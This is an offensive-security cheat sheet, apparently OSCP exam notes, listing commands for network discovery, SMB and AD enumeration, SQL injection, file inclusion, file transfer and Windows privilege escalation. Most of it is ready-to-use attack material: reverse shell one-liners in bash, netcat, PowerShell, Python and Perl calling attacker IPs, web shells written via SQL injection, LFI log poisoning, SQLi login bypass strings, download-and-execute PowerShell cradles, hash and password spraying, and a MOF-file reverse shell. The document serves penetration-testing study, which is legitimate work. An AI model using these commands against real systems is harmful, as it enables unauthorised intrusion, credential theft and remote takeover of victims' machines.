# Offensive Security Documentation
OSCP Links:
- https://github.com/0x4D31/awesome-oscp 
- https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#preperation
- https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97

## Discovery
- Fast host discovery for big ranges (pingscan):   
  `nmap -sn -T5 --min-parallelism 100 --max-parallelism 256 -oA nmap_10.0.0.0-8_hostdiscovery 10.0.0.0/8`   
- Thorough host discovery TCP:   
   `TOPTCP="$(grep -E "^[^#]*/tcp" /usr/share/nmap/nmap-services | sort -k 3nr | cut -f2 | cut -f1 -d/ | head -1000 | tr '\n' ',')"`   
   `nmap -n -sn --reason -PR -PE -PP -PM -PO -PY -PA -PS"$TOPTCP" -PU -iL targets.txt -oA nmap_host_discovery_arp_icmp_ip_sctp_tcp_udp`   
   Quick Win Ports:   
   `# nmap -n -Pn -sS -p 21,23,69,80,88,389,636,111,139,443,445,1433,2049,3263,3264,3306,5432,5900,5985,6000,8080,8443,22,25,587,53,3389 -oA quick_wins_tcp_vlans -iL ranges.txt --min-hostgroup 256 --max-retries 1 --defeat-rst-ratelimit --min-rate 10000
`   
   Add discovered hosts to textfile:  
   `awk '/Up$/{ print $2 }' nmap_host_discovery_arp_icmp_ip_sctp_tcp_udp.gnmap | sort -V > targets_online.txt`   
- Host / Service discovery UDP:   
   Get top 100 UDP ports:  
   `grep -E "^[^#]*/udp" /usr/share/nmap/nmap-services | sort -k 3nr | cut -f2 | cut -f1 -d/ | head -100 > udp_ports`   
   Get all UDP ports that have a payload that is sent by nmap. The chances are higher, that you will get a response when nmap sends a valid payload and the port is then treated as definitively open (instead of filtered|open when no response was received):  
   `grep ^udp /usr/share/nmap/nmap-payloads | cut -d " " -f2 | tr , '\n' | sort -un >> udp_ports`   
   Get all UDP ports that have a nmap-script. The chances are again higher that you will receive a response when the script is executed:  
   `grep -l -E "categories.*default" /usr/share/nmap/scripts/* | xargs grep -h -E "portrule.*udp" | grep -o -E "[0-9]+" >> udp_ports`   
   Assign them to a variable:  
   `UDPPORTS="$(sort -un udp_ports | tr '\n' ,)"`   
   Start scanning:  
   `nmap -n -Pn --reason -sU -sC -p "$UDPPORTS" -iL targets.txt --excludefile targets_online.txt -oA nmap_host_discovery_udp_service_scan`   
   Now add hosts with open UDP Ports to targets_online.txt:   
   `awk '/\/open\//{ print $2 }' nmap_host_discovery_udp_service_scan.gnmap  >> targets_online.txt`   

- Full TCP service scan on found hosts:  
   `nmap -n -Pn --reason -sS -sC -sV -p- -O -iL targets_online.txt -oA nmap_service_scan_tcp`
 
- If you want only open ports without all the details:  
   `nmap -n -Pn --reason -sS -p- -iL targets_online.txt -oA nmap_service_scan_tcp`

- start with less ports until full scan is done:  
   `nmap -n -Pn --top-ports 100 --reason -sS --min-hostgroup 128 --max-retries 1 --min-rate 500 --defeat-rst-ratelimit -iL targets_online.txt -oA nmap_SYN_scan_TCP_TOP_100`  

- NMAP result grepping:   
  Get all open ports from multiple nmap scans:   
  `# cat nmap_service_scan_udp.nmap nmap_service_scan_tcp.nmap | awk -F/ '/(tcp|udp).*open /{ print $1}' | sort -un | tr '\n' ','`   
- NMAP Reports:  
   https://github.com/maaaaz/nmaptocsv  
   `python nmaptocsv.py -x SMBClientScan.xml -f ip-port-protocol-service-version-os >> output.csv` 

- NMAP based OS Discovery:  
   `nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ipaddress>` 

- Discovery & Data Gathering tools:
  `https://github.com/codingo/Reconnoitre` 
  
- Replace nmap with netcat:  
  `nc -z -v {host-name-here} {port-range-here}`  
  `nc -nvv -w1 -z 10.X.X.Y 1-100 2>&1 | grep open`  
  ``for port in `seq 65535`; do { disown -r ; nc -nvv -w1 -z 10.X.X.Y $port 2>&1 | grep ' open' & } 2>/dev/null ; disown -r ; done``  

## DNS Enum in AD Domains
Check out adidnsdump from dirkjanm: https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/   
First list zones:   
`proxychains adidnsdump -u domain.local\\username --print-zones <DC/DNS IP> --dns-tcp`   
If we specify the zone to the tool (or leave it empty for the default zone), we will get a list of all the records. Records which can be listed but not read (so called “hidden” records) are shown but only with a question mark, as it is unknown which type of record is present and where it points to. The records are all saved to a file called records.csv.   
`proxychains adidnsdump -u domain.local\\username <DC/DNS IP> --dns-tcp`   

## HTTP/HTTPS
- `curl -i <ip>`   
- `nikto -host $targetip -port $targetport`
- `./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $targetip -e php`
- `gobuster dir -e -k -w /usr/share/wordlists/dirb/common.txt -r -u https://www.example.com` 
   `gobuster with cookies: gobuster dir -e -k -w /usr/share/wordlists/dirb/common.txt -c 'connect.sid=s%3AEKo...jYluY; JSESSIONID=3asdasd889DF94A;' -r -u  https://somedomain.com`
- gobuster comprehensive busting:
  `gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'`  
- gobuster search with file extension:
  `gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php`  

- Wordpress scan:
  `wpscan -u 10.10.10.10/wp/` 
  
- Login pages:  
  Username enumeration through  
  - Checking login failed message  
  - Registering account (try same email twice, same username twice)  

- PHP Logfile contamination:  
  (add the PHP code to the logfile and the with LFI get the logfile somewhere where "include PHP function" is being used)
  `kali@kali:~$ nc -nv 10.11.0.22 80`  
  `(UNKNOWN) [10.11.0.22] 80 (http) open`  
  `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`  
  Use the PHP code in the logfile:  
  `http://10.11.0.2/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`  

- Screenshots using GoWitness (via burp proxy):
  First install chrome:    
  ```
  curl -L https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb > google-chrome-stable_current_amd64.deb
  sudo dpkg -i google-chrome-stable_current_amd64.deb
  ```
  Then run gowitness: (second example via burp proxy)    
  ```
  ./gowitness-3.0.5-linux-amd64 scan nmap -f /home/nmap_results.xml --open-only --service-contains http
  ./gowitness-3.0.5-linux-amd64 file -f urls.txt --delay 10 -p http://127.0.0.1:8080
  ```
  GoWitness report creation:   
  `./gowitness-2.4.2-linux-amd64 report export -f gowitness-report.zip`   

- Aquatone Installation:
   `wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip`   
   `unzip aquatone_linux_amd64_*.zip -d /opt/aquatone/`   
   If google chrome is not yet installed:    
   `echo "deb [arch=amd64] https://dl.google.com/linux/chrome/deb/ stable main" > /etc/apt/sources.list.d/google-chrome.list`   
   `wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -`   
   `apt-get update`   
   `apt-get install google-chrome-stable`   
   Aquatone Usage:    
   Collect data based on nmap report: `cat nmap.xml | /opt/aquatone/aquatone -nmap -chrome-path /usr/bin/google-chrome -out screenshots -ports xlarge`   
   Run Aquatone on list of IPs with specific ports: `cat ips.txt | /opt/aquatone/aquatone -chrome-path /usr/bin/google-chrome -out screenshots -ports 25,80,161,264,443,2001,3478,4999,5222,6080,8443,18264,27299,38751`  

- https://guif.re/webtesting
- https://sushant747.gitbooks.io/total-oscp-guide/common_web-services.html 

## SMB
- `nmap -p 139,445 --script=smb-vuln* $targetip`  
- `enum4linux -a $targetip`  
- `smbclient \\\\$ip\\$share`  
- `smbmap -H <IPAddress>`  
- `nbtscan`  
- ` smb 10.11.1.1/24`
- Null connect:
  `rpcclient -U "" 10.10.10.10` 
- Try known creds on targets: `nxc smb 10.11.1.1/24 -u Administrator -p 99bbVDdorGzfZJun`  
- Bruteforcing: `nxc smb 10.11.1.1/24 -u /ville/Desktop/OSCP/PWK/users.txt -p /ville/Desktop/OSCP/PWK/pws.txt`  
- Check accessible shares in network with specific domain account:   
  `# smbmap -d <domain> -u <username> -p <password> --host-file files/smbhosts.txt`  
- Search for sensitive data on shares with smbmap:   
- `# smbmap -d DOMAIN -u USER -p PASSWORD --host-file hosts.txt -r -A ".+\.(bat|cmd|ini|kdb|kdbx|key|ps1|reg|txt|vbs)|.*(admin|login|pass|secret|sensitive).*|unattend.*\.xml|web.config" --depth 3`   
- Query AD users in domain from Kali with known credentials:    
  `# /opt/impacket/examples/GetADUsers.py -all domain.local/user1:Str0ngP@ss2021 -dc-ip 192.168.10.1`   
- Search interesting files using MANSPIDER:   
  `manspider host.domain.local --sharenames generalshare -e bat ps1 cfg conf kdbx rtsz -d domain.local -u user1 -p somepass`   

Get files from SMB share:  
- /usr/share/doc/python-impacket/examples# python smbclient.py 10.11.1.136  
- `shares` --> list shares  
- `use <share>` --> use share xyz   
- `get <file>` --> download file  
Or with smbget:  
- `smbget -R smb://1.1.1.1/folder`  

Transfer files from the Kali VM with smbserver.py:  
- `python /usr/lib/python2.7/dist-packages/impacket/smbserver.py share /root/Desktop/OSCP/SMB/SMBServer/`  
- on the Windows target, get the connection to the share with e.g.: `net use \\<kali-ip>\share`  
- copy the file from the remote target to the kali: `copy file.txt \\<kali-ip>\share\


## WinRM
- WinRM from Linux: https://github.com/Hackplayers/evil-winrm  
  `# ruby evil-winrm.rb -i 10.10.10.169 -u Hans -p 'Wurst123!' -s /opt/PowerSploit/Privesc/`  
  `*Evil-WinRM* PS C:\Users\Hans\Documents> PowerUp.ps1`  
  Now, locate all imported functions with "menu"   
- Evil-WinRM with custom scripts:   
  `# locate PowerSploit/Privesc/Privesc.psd1`   
  `/opt/PowerSploit/Privesc/Privesc.psd1`   
  `# ruby evil-winrm.rb -i 10.10.10.169 -u Hans -p 'Wurst123!' -s /opt/PowerSploit/Privesc/`   

## WMI Commands
- You can run WMI commands remotely without using WinRM / PSExec:   
  [WMI doc](wmi.md)   

## NFS
 - `nmap -p 111 --script=nfs* -iL nfstargets.txt`  
   example output:  
   `PORT    STATE SERVICE`  
   `111/tcp open  rpcbind`  
   `| nfs-ls: Volume /home`  
   `|   access: Read Lookup NoModify NoExtend NoDelete NoExecute`  
   Mount the dir:  
  `mkdir nfsmount; sudo mount -o nolock 10.11.1.72:/home ~/nfsmount/`  

## FTP
- First check for anonymous access  
  `ftp $targetip`  
  `Username: anonymous`  
  `Password: anything`  

Path traversal: 
- FTP: `ftp://10.11.1.125/../../../../windows/system32/wbem/logs/mofcomp.log`  

## DNS 
- DNS Zone transfer lookup  
  `host -l <domain> <nameserver IP address>`  
  (e.g.: host -l megacorpone.com 38.100.193.80)  
  this might provide additional information about the network, listing hostnames and ip addresses  

## SSH
- "unable to negotiate with ... no matching key ex found" --> add to config:   
  `# cat /root/.ssh/config`  
  `host 10.11.1.252`   
     `KexAlgorithms +diffie-hellman-group1-sha1`  
     `PubkeyAcceptedKeyTypes=+ssh-dss`  

- "xxxx must be run from a terminal" --> spawn terminal:
   1. `echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py` 
   2. `python /tmp/asdf.py` 
- SSH Tunnel (Source --> public ip 1.1.1.1 --> machine with private ip 2.2.2.2) to RDP to internal VM (2.2.2.2)  
  `ssh -l <username-on-1.1.1.1> (-i key.txt) -L 1337:2.2.2.2:3389 1.1.1.1`  
  Afterwards you can RDP to the internal VM with: localhost:1337  
  Another example:   
  `ssh -l username@sshjumphost -i key -L 1337:20.130.239.71:3389 sshjumphost.com`   
  Now connect RDP with 127.0.0.1:1337   
  
- SSH Tunnel with SSHuttle:  
  `sshuttle -vvr user@10.10.10.10 10.1.1.0/24` 
  With SSH Key:  
  `sshuttle -vr root@10.10.10.13 172.16.1.0/24 --ssh-cmd 'ssh -i sshloginkey.txt'`  
  Now all traffic to 172.16.1.0/24 will be sent to the tunnel

- SSH JumpProxys:   
  `on kali VM:`  
  `# cat ~/.ssh/config`  
  `Host remotehost`  
  `  User remoteuser`  
  `  IdentityFile ~/.ssh/id_rsa`   
  `  ProxyJump user@jumphost.com`   
  Then use with:   
  `# ssh remotehost`   

## SMTP
- check if user exists:  
  `nc -nv <ip address> 25`  
  `VRFY <username>`  
  automate with bash:  
  `for user in $(cat users.txt); do echo VRFY $user | nc -nv -w 1 192.168.100.100 25 2>/dev/null | grep ^"250";done` 

## SNMP
- `snmp-check 10.10.10.10`  

## Exploits / Searchsploit
- Update Searchsploit
  `searchsploit -u`  
- Search exploit  
  `searchsploit $multiple $search $terms` 

## SQL Injection
SQLMap
- Use saved request from burp: (-p is parameter, can be removed if you add * to the param in the request file, remember to use force-ssl param!)  
  `sqlmap -r request.txt -p objectid --risk 2 --level 5`
  Note: risk level 3 could in some cases lead to updating all entries in a db! If you want to use this risk level, check the payloads in xml/payloads.xml!   
- Define the target DBMS and run the request through local proxy (e.g. burp). Show the schema of the DB:   
  `sqlmap --proxy http://localhost:8080 -r request --dbms="Microsoft SQL Server 2017" --schema --force-ssl`   
- SQLMap Crawl:  
  `sqlmap -u http://10.10.10.10 --crawl=1`   
- SQLMap Dump DB:  
  `sqlmap -u http://10.10.10.10 --dbms=mysql --dump`    
- SQLMap Shell:   
  `sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell`   
- SQL Shell through UNION based SQL Injection in "TextBoxUsername" field:    
  `sqlmap -r request.txt -p TextBoxUsername --sql-shell --technique=U --force-ssl`    
- Search for columns with the name password    
  `python sqlmap.py -u "http://192.168.1.1/mypath/mypoorlywrittenapp.asp?SessionID=" --time-sec=1 --search -C 'password'`    

Bypasses  
  `' or 1=1;#`  (MySQL/MariaDB)
  `' or 1=1 LIMIT 1;#`  (MySQL/MariaDB) --> If e.g. login expects only one entry in returned query
  `' or 1=1 LIMIT 1 --`  
  `' or 1=1 LIMIT 1 -- -`  
  `' or 1=1 LIMIT 1#`  
  `' or 1#`  
  `' or 1=1 --`  
  `' or 1=1 -- -`  
  `id=1'+OR+1=1--#`   
  `id=1\n'+OR+1=1--#`   

Queries
- Upload php command injection file:  
  `union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'`  
- Load file:  
  `union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6` 

MySQL 
- Enumerate tables:  
  `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,table_name,6 FROM information_schema.tables` 
- Get columns of specific table:  
  `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'` 
- Get content of table:  
  `http://10.11.14.101/comment.php?id=769 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users`  
- Create new php file with cmd.exe:  
  `http://10.11.14.101/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`  
- Use the new page with params:  
  `http://10.11.14.101/backdoor.php?cmd=whoami`  

## MSSQL    
- Nmap scripts with db credentials:  
  `# nmap -n -Pn -p1433 --script "ms-sql-* and not ms-sql-brute" --script-args mssql.username=sa,mssql.password=<pw> 10.11.1.31`  
- Impacket mssqlclient.py:   
  `mssqlclient.py HOSTNAME/USERNAME:'PASSWORD'@10.10.10.22 -windows-auth`   
  Check if the user is sysadmin:   
  `SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')`  
  `-----------`   
  `1`  
  Run OS commands through xp_cmdshell:  
  `SQL> EXEC sp_configure 'xp_cmdshell', 1`  
  `[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.`  
  `SQL> reconfigure;`  
  `SQL> xp_cmdshell "whoami"` 
  `[...]`  
  `hostname\sql_svc`  
  Using PowerUpSQL:  
  `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')`  
  `$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username "domain\user" -password "passw0rd123" | Where-Object {$_.Status -like "Accessible"}`  
  `Invoke-SQLAudit -Verbose -Instance "servername.domain.local,1433"`  
  Manually get all SQL SPNs from list of reachable SQL servers:   
  `# add all sql targets to a file called sql_hosts.txt`   
  `# get all SPNs into a file:`   
  `foreach($entry in (Get-Content .\sql_hosts.txt)){ $dnsname = (Resolve-DnsName $entry).Namehost; setspn -q *MSSQL*/*$dnsname* | select-string "MSSQL" | Out-File sql_instances.txt -Append }`   

  import PowerUpSQL and run the SQLAudit on all instances:    
  `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')`   
  `foreach($item in ((Get-Content .\sql_instances.txt).trim() | ? {$_ -ne ""})){ Invoke-SQLAudit -Verbose -Instance "$item"}`   
  
  Run Query using PowerUpSQL:   
  `Get-SQLQuery -Instance "sql1.domain.local,1433" -Query "select @@servername"`   
  Using Impacket mssqlclient.py:   
  `python3 /usr/local/bin/mssqlclient.py -windows-auth DOMAIN/user@10.10.100.100`   
  `SQL> select @@servername;`   

  SMB Relay through xp_dirtree:  
  Run responder on kali with `/opt/Responder/Responder.py -I eth0 -w -r -f -d`   
  Initiate connection on xp_dirtree vulnerable sql server: `Get-SQLQuery -Verbose -Instance "servername.domain.local,1433" -Query "EXEC master.sys.xp_dirtree '\\<kali-ip>\test123'"`   
  or: `Get-SQLQuery -Instance servername.domain.local -Query "xp_fileexist '\\<kaliip>\file'" -Verbose | out-null`
  or: `nxc mssql -u user01 -p '<pw>' --dns-server 10.10.10.1 -d domain.tld -q 'EXEC xp_dirtree "\\10.10.10.10\hellofromnxc"' /home/kali/mssql_targets.txt`   
  
  SQL Command Execution:   
  `Invoke-SQLOSCmd -Instance "sql1.domain.local,1433" -Command "whoami" -RawResults`   
  Using mssqlclientpy:    
  `EXEC xp_cmdshell 'whoami';`    
  
### Using SPN List
**Resolve all hosts for their IP** (If needed to check in scope items):   
```powershell
foreach($entry in (get-content "C:\Users\bob\Desktop\sqlhostnames.txt")){
    $dnsentry = Resolve-DnsName -Name $entry -TcpOnly -Server 10.0.0.1 -ErrorAction SilentlyContinue
    if($dnsentry.count -gt 0){ $dnsentry | % {"$($_.Name),$($_.IPAddress)"} }else{ "$entry,N/A" }
    start-sleep -Seconds 5
}
```
Use the list with PowerUpSQL:
`get-content .\sqlinstances.txt | Get-SQLConnectionTest -Verbose -Username "domain\user" -password "asdfasdf"` 

## File inclusion
- LFI: http://target.com/?page=home --> http://target.com/?page=./../../../../../../../../../etc/passwd%00
- RFI: http://target.com/?page=home --> http://target.com/?page=http://hackerip/evil.txt%00
- With LFI, data wrappers can be used:
  `http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>`  

## Reverse Shells
Linux:
- Pipe /bin/sh back to 10.0.0.1 port 1234:  
  `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f ` 
- More: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
- `nc -e /bin/sh 10.10.10.10 4443` 
- `bash -i >& /dev/tcp/10.10.10.10/443 0>&1`  

Windows:
- nc.exe on Windows:  
  `nc.exe -e cmd.exe attackerip 1234` 
- PowerShell:  
  `powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` 
- Python:  
  `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`  
- Perl:  
  `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` 

PHP:
- First modify the post request parameters to create a php file which executes the shell:  
  `q=test&lang=en' union select all 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/newbackdoor.php';#`  
  afterwards run the command to spawn a reverse shell:  
  `http://10.11.14.101/newbackdoor.php?cmd=c:\users\offsec\desktop\tools\netcat\nc.exe -nv 10.11.0.90 443 -e cmd.exe` 
- Alternative:  
  `<?php echo system($_GET["cmd"]);?>` 

## Info Gathering 
### Windows
- PS History: `cat (Get-PSReadlineOption).HistorySavePath`  
- `type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`  
- `Get-ScheduledTask| % { $_.Actions}` 
- `schtasks /query /v /fo LIST`  
- IIS App Pool Creds: `(ls IIS:\AppPools | Get-ItemProperty -Include ProcessModel).ProcessModel | select UserName,Password`  
- psexec.py Login with account:  
`psexec.py administrator@10.10.10.10`  

### Active Directory
- Query AD without PS AD Modules  
  List Global Catalogs of a forest:
   `([System.DirectoryServices.ActiveDirectory.Forest]::Getcurrentforest()).GlobalCatalogs`  
- User Enumeration  
   https://github.com/sensepost/UserEnum
- User Enumeration using Impacket:   
  `# lookupsid.py domain.local/username:password@<dc-ip>`   
- Return all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences. (Using PowerUp)   
  `Get-DomainGPOLocalGroup`   
- Enumerate the machines where a specific domain user/group is a member of a specific local group. (Using PowerUp)
  `powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators`   
- Find domain machines were specific users are logged into. (Using PowerUp)   
  `Find-DomainUserLocation`   
- Query Session information of a remote (or local) computer. (Using PowerUp)
  `Get-NetSession -ComputerName dc1`   
- krbtgt Account: If the krbtgt was created with Windows 2000, the chance is its pw is user provided and can be cracked (pwdLastSet should be before ~2003/4?)   
- Python port of PowerView (Pywerview): https://github.com/the-useless-one/pywerview   

### Network
- run wireshark, save dump --> `./Pcredz -f dump.pcap`  
  or: `sudo ./net-creds.py -p dump.pcap` 

### MySQL command line
- using found credentials:   
  ` mysql -uroot -p<pass> -e 'show databases;'`   
## crackmapexec (Use NetExec instead!)
- "hash spraying" (in this case with local administrator)  
   `cme smb 172.16.1.0/24 -u Administrator -H 7facdc498ed1680c4fd1448319a8c04f --local-auth` 
- Share enumeration with credentials:  
  `cme smb 172.16.1.0/24 -u bill -p 'password' --shares` 
- Test if user and password combination of domain user are correct:   
  `crackmapexec smb domain.local -d DOMAIN -u username -p password`   
- CME using Kerberos: (Requires FQDN in request to be the same as in the krb ticket!)
  ```
  $ export KRB5CCNAME=/home/testuser/impacket/administrator.ccache 
  $ cme smb zoro.gold.local --use-kcache
  ```

## NetExec
List readable or writable share:   
`#~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares --filter-shares READ WRITE`   

Enumerate domain users on the remote target:   
`nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users`   
  
## Password Spraying
- Using Kerbrute:   
  `# ./kerbrute_linux_amd64 passwordspray --dc 10.10.10.1 -d example.net userlist.txt 'F00B@r23!'`   
- Check username with username as password:   
  `# ./kerbrute_linux_amd64 passwordspray --dc <dcip> -d domain.local adusers.txt --user-as-pass `   
- PowerShell script: https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1   
### Analysis in BloodHound
1. Store all users to a textfile owned_users.txt   
2. Add a flag to all these users in the Neo4j DB that could be sprayed successfully using BloodHoundLoader (https://git.compass-security.com/csnc/tools2go/blob/master/stable/bloodhound/BloodHoundLoader.py):   
   `# ./stable_bloodhound_BloodHoundLoader.py -o "pwspray='pw1'" owned_users.txt`   
4. Because you own the password of these users, you can also mark them as owned in BloodHound:   
   `# ./stable_bloodhound_BloodHoundLoader.py -m o owned_users.txt`   
5. Use the following Cypher query to get the users and their local admin count (adjust the added flag, e.g. u.pwspray = "pw1"):   
   ```
   MATCH (u:User) WHERE u.pwspray = "pw1"
   OPTIONAL MATCH (u)-[:AdminTo]->(c1:Computer)
   OPTIONAL MATCH (u)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c2:Computer)
   WITH u, COLLECT(c1) + COLLECT(c2) AS tempComputers UNWIND tempComputers AS computers
   RETURN u.name, COUNT(DISTINCT(computers))
   ORDER BY COUNT(DISTINCT(computers)) DESC
   ```
 
 ## ASRepRoasting   
 - using impacket:   
   `# python3 GetNPUsers.py <domainname>/ -usersfile /root/Desktop/adusers.txt -dc-ip <dcip>`   

## File Transfer
### PowerShell File Download
- `Invoke-RestMethod -Uri $uri -Method Post -InFile $uploadPath -UseDefaultCredentials` 
- `IEX ((New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"))`  
- `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"`  

### Download base64 encoded file   
- `[System.IO.File]::WriteAllBytes("c:\windows\temp\telem.exe",[System.Convert]::FromBase64String((New-Object Net.Webclient).downloadstring("https://XOURDOMAIN.COM")))`   

### netcat
- transfer files from kali to windows:  
   1. open listener on target: `nc -nlvp 4444 > incoming.exe` 
   2. send file to target:  `nc -nv 10.0.0.22 4444 < /usr/share/windows-binaries/wget.exe` 
- transfer files from windows to kali:  
   1. on Kali: `nc -nlvp 4444 > file.txt` 
   2. on Windows: `nc.exe -10.11.0.90 4444 < c:\users\bla\file.txt` 

### Impacket
- connect smbclient.py with hash:   
  `/usr/share/doc/python3-impacket/examples/smbclient.py -hashes :175a592f3b0c0c5f02fad40c51412d3a Administrator@10.11.1.202` 
- get shares: `shares` 
- upload something to c$:  
  `use C$`  
  `put /var/www/html/transfer/nc.exe` 

### Download with SCP
- when having SSH key to remote target, download file with:  
  `scp -i mysshprivatekey user@10.10.10.10:/home/myuser/filename /home/folder/targetfilename`  
- Multiple files:
  `scp -r -i C:\Users\username\.ssh\sshkey user@1.1.1.1:/home/user/nmap_results* .`
- From Windows using Putty: (using user root on the target vm "kali" to download the file /tmp/file.bin to the current dir on Windows)   
  `pscp root@kali:/tmp/file.bin .`   

### Upload  
  `# scp -r localfolder/ user@remotehost:/targetdir/`   
  Single file:   
  `$ scp -i /home/kali/.ssh/id_rsa /home/kali/Desktop/urls.txt username@server.domain.com:/home/username/urls.txt`   
 - On Windows using Putty:   
  `C:\Payloads>pscp beacon-http.bin root@kali:/tmp/beacon.bin`

### SSH copy
- file: `scp -p 192.168.1.100:/root/filetocopy targetfile` 
- directory: `scp -r root@192.168.1.100:/var/log ~/backup-logs`  

### Others
- `smbget -R smb://1.1.1.1/folder` 
- LOLBins Windows: https://lolbas-project.github.io/
- LOLBins Linux: https://gtfobins.github.io/
- Updog (https://github.com/sc0tfree/updog) --> `updog -d /tmp/www/ -p 443 --password SuperS3cr3t --ssl`   
- goshs (https://github.com/patrickhener/goshs) --> supports user provided certs   

## PrivEsc Windows
- https://github.com/vu-ls/Crassus
- https://github.com/itm4n/PrivescCheck   
- missing patches:   
  https://github.com/rasta-mouse/Sherlock   
  https://github.com/rasta-mouse/Watson   

- One liner for privesccheck:   
  `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1');Invoke-PrivescCheck -Extended -Report prvcheckreport -Format HTML,CSV`


- Add new admin:
  `net user /add [username] [password]`  
  `net localgroup administrators [username] /add` 

- `IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")`  
  `Invoke-AllChecks`
  
- Search for passwords in ini,xml and txt files:  
  `findstr /si password *.xml *.ini *.txt`  
  
- Check services:  
  `wmic service get name, displayname, pathname, startname`  
  Check insecure service permissions:  
  `accesschk.exe -accepteula -uwcqv "Authenticated Users" *`  

- Check Privileges with: `whoami /priv`  
  If User has `SeImpersonate` or `SeAssignPrimaryToken` (most often service accounts!) you can get to SYSTEM by using the "potato": https://github.com/ohpe/juicy-potato  
  For IIS: https://www.youtube.com/watch?v=wK0r-TZR7w8&feature=emb_title  
  For SQL Server: https://www.youtube.com/watch?v=3CPdKMeB0UY&feature=emb_title 
  
If you have path traversal plus a location with write access you can exploit that with a malicious MOF file:  
1. Generate MOF template with msf module "exploit/windows/smb/psexec":  
  msf5 exploit(windows/smb/psexec) > `irb`  
  [ ... ] >>`puts generate_mof("Specialclass","ToOpenReverseShell")`  
2. Copy it to a MOF and replace the following line  
  `ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\"ToOpenReverseShell\");}`  
  with:  
  `ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\"nc -e cmd 10.11.0.90 9001\");}`  
3. Transfer the nc.exe to the targets C:\windows\system32  
4. Start netcat listener on kali (same port as above in code!)
5. Transfer the MOF file:  
  `put filename.mof ../../../../windows/system32/wbem/mof/Specialclass.mof`  
  --> This will provide you with a reverse shell!

- Error "This program cannot be run in DOS mode."  
  When you get this error in a shell when trying to run uploaded files through FTP, try to first change the mode to binary, before you PUT the file:  
  `ftp> binary`  
